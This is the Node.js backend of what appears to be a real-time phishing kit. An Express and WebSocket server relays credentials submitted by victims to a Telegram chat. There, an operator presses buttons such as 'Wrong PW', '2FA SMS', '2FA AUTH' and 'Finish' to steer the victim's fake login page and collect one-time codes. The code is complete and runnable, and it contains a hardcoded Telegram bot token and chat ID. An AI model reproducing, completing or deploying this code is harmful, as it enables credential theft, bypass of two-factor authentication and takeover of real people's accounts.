const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const http = require('http'); // Import the HTTP module

const app = express();
const botToken = '7539675476:AAG3HvyqvP4xapW_k6HG_VlsOTWvjiK5z7M'; // Replace with your bot token
const bot = new TelegramBot(botToken, { polling: true });

// Create HTTP server
const server = http.createServer(app);

// Attach WebSocket server to the HTTP server
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(bodyParser.json());

// Map to store WebSocket clients and their unique IDs
const clients = new Map();
// Map to track Telegram message IDs and their associated userIds
const messageToUserMap = new Map();

wss.on('connection', (ws, req) => {
  const userId = uuidv4(); // Generate a unique ID for each client
  const ip = req.socket.remoteAddress;

  clients.set(userId, ws);

  console.log(`New client connected: UserID: ${userId}, IP: ${ip}`);

  ws.send(JSON.stringify({ type: 'welcome', userId, ip }));

  ws.on('message', (message) => {
    console.log(`Message from UserID ${userId}: ${message}`);
  });

  ws.on('close', () => {
    clients.delete(userId);
    console.log(`Client disconnected: UserID: ${userId}`);
  });
});

// Function to send data to a specific user via WebSocket
const sendToUser = (userId, data) => {
  const client = clients.get(userId);
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify(data));
  } else {
    console.error(`Client with UserID ${userId} is not connected.`);
  }
};

// Telegram Bot: Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome! Use the buttons below to interact:', {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Show Message', callback_data: 'show_message' }],
        [{ text: 'Perform Action', callback_data: 'perform_action' }],
      ],
    },
  });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  const userId = messageToUserMap.get(query.message.message_id);

  if (!userId) {
    console.error(`No userId found for message ID: ${query.message.message_id}`);
    return;
  }

  if (query.data === 'show_message') {
    sendToUser(userId, { type: 'new_message', payload: 'Message from Telegram' });
  } else if (query.data === 'perform_action') {
    sendToUser(userId, { type: 'perform_action', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action2') {
    sendToUser(userId, { type: 'perform_action2', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action3') {
    sendToUser(userId, { type: 'perform_action3', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action4') {
    sendToUser(userId, { type: 'perform_action4', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action5') {
    sendToUser(userId, { type: 'perform_action5', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action6') {
    sendToUser(userId, { type: 'perform_action6', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action7') {
    sendToUser(userId, { type: 'perform_action7', payload: 'Action triggered from Telegram' });
  } else if (query.data === 'perform_action8') {
    sendToUser(userId, { type: 'perform_action8', payload: 'Action triggered from Telegram' });
  }
 
  bot.answerCallbackQuery(query.id);
});

app.post('/send-message', (req, res) => {
  const { message, userId } = req.body;
  const chatId = '-1002663720964'; // Replace with your chat ID

  if (!clients.has(userId)) {
    return res.status(404).send({ error: 'User not connected.' });
  }

  bot.sendMessage(chatId, `${message}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Wrong Email', callback_data: 'perform_action2' }],
        [{ text: 'Wrong PW', callback_data: 'perform_action3' }],
        [{ text: '2FA SMS', callback_data: 'perform_action4' }],
        [{ text: '2FA WA', callback_data: 'perform_action' }],
        [{ text: '2FA EMAIL', callback_data: 'perform_action7' }],
        [{ text: '2FA AUTH', callback_data: 'perform_action8' }],
        [{ text: 'Wrong 2FA', callback_data: 'perform_action5' }],
        [{ text: 'Finish', callback_data: 'perform_action6' }],
      ],
    },
  }).then((sentMessage) => {
    messageToUserMap.set(sentMessage.message_id, userId); // Map Telegram message ID to userId
    console.log(`Message ID ${sentMessage.message_id} mapped to UserID ${userId}`);
  });

  // Notify the frontend user that the message was sent
  sendToUser(userId, { type: 'acknowledge', payload: 'Message sent successfully!' });

  res.send({ status: 'Message sent to Telegram!' });
});

// Start the server on a single port
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
